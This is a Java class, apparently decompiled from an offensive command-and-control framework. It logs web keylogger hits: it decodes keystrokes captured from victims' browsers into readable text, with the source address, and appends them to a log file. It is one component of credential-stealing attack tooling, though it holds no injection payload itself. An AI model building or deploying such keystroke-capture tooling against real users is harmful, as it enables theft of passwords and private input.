package common;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.util.Map;
import java.util.Stack;
import sleep.runtime.SleepUtils;

public class WebKeyloggerEvent implements Serializable, Transcript, Scriptable, Loggable {
   public String from;
   public String who;
   public String data;
   public String id;

   public WebKeyloggerEvent(String var1, String var2, Map var3, String var4) {
      this.from = var1;
      this.who = var2;
      this.data = var3.get("data") + "";
      this.id = var4;
   }

   public Stack eventArguments() {
      Stack var1 = new Stack();
      var1.push(SleepUtils.getScalar(this.id));
      var1.push(SleepUtils.getScalar(this.data));
      var1.push(SleepUtils.getScalar(this.who));
      var1.push(SleepUtils.getScalar(this.from));
      return var1;
   }

   public String eventName() {
      return "keylogger_hit";
   }

   public String getBeaconId() {
      return null;
   }

   public void formatEvent(DataOutputStream var1) throws IOException {
      var1.writeBytes(CommonUtils.formatLogDate(System.currentTimeMillis()));
      var1.writeBytes(" [HIT] " + this.from);
      var1.writeBytes(", address: ");
      var1.writeBytes(this.who);
      var1.writeBytes(", id: ");
      var1.writeBytes(this.id);
      var1.writeBytes("\n");
      String[] var2 = this.data.split(",");

      for(int var3 = 1; var3 < var2.length; ++var3) {
         int var4 = CommonUtils.toNumberFromHex(var2[var3], -1);
         switch (var4) {
            case 8:
               var1.writeBytes("<DEL>");
               break;
            case 9:
               var1.writeBytes("<TAB>");
               break;
            case 10:
            case 13:
               var1.writeBytes("<ENTER>");
               break;
            case 11:
            case 12:
            default:
               var1.writeByte((char)var4);
         }
      }

      var1.writeBytes("\n\n");
   }

   public String getLogFile() {
      return "webkeystrokes.log";
   }

   public String getLogFolder() {
      return null;
   }
}
